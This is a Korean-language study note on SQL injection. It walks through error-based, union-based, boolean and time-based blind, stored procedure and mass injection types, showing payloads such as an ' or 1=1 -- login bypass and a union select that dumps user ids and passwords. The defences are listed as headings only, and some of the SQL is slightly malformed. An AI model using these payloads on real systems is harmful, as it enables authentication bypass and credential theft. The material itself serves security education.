# SQL Injection

> 임의의 SQL 문을 주입해 DB 가 비정상적인 동작을 야기하는 해킹공격 중 하나이다.

OWASP 이라는 곳에서 발표한 웹 취약점 Top 10 이 있다.

SQL Injection 이 첫 번째로 있을정도로, 공격이 쉬운 편이고 큰 피해를 입힐 수 있는 공격이다.

## 1. SQL Injection 종류

### 1-1. Error based SQL Injection

1. 기존 쿼리문

    ```sql
    select * from users where id = 'input1' and password = 'input2'
    ```

2. 주입

    ```sql
    ' or 1=1 --
    ```

3. 결과
    ```sql
    select * from users where id = '' or 1=1
    -- and password = 'input2'
    ```

### 1-2. Union based SQL Injection

1. 기존 쿼리문

    ```sql
    select * from board where title like '%input%' or contents '%input%'
    ```

2. 주입

    ```sql
    ' union select null, id, password from users --
    ```

3. 결과

    ```sql
    select * from board where title like '' union select null, id, password from users --
    ```

### 1-3. Blind SQL Injection - Boolean

1. 기존 쿼리문

    ```sql
    select * from users where id = 'input1' and password = 'input2'
    ```

2. 주입

    ```sql
    abc123' and ascii(substr(select from information_schema.tables where table_type='base table' limit 0,1)0,1) > 100 --
    ```

3. 결과

    ```sql
    select * from users where id = 'abc123' and ascii(substr(select from information_schema.tables where table_type='base table' limit 0,1)0,1) > 100 --
    ```

### 1-4. Blind SQL Injection - Time

1. 기존 쿼리문

    ```sql
    select * from users where id = 'input1' and password = 'input2'
    ```

2. 주입

    ```sql
    abc123' or (length(database()) = 1 and sleep(2)) --
    ```

3. 결과

    ```sql
    select * from users where id = 'abc123' or (length(database()) = 1 and sleep(2)) --
    ```

### 1-5. Stored Procedure SQL Injection

Stored Procedure 는 쿼리문들을 모아 하나의 함수처럼 사용하기 위한 것이다.

단, 공격자가 시스템 권한을 획득해야 하므로 난이도는 높으나 성공한다면 서버에 직접적인 피해를 입힐 수 있다.

### 1-6. Mass SQL Injection

기존 SQL Injection 과 달리 한번의 공격으로 다량의 데이터베이스가 조작되어 큰 피해를 입히는 것을 의미한다.

## 2. 대응 방법

### 2-1. 입력 값에 대한 검증

### 2-2. Prepared Statement

### 2-3. Error Message 노출 금지

### 2-4. 웹 방화벽 사용
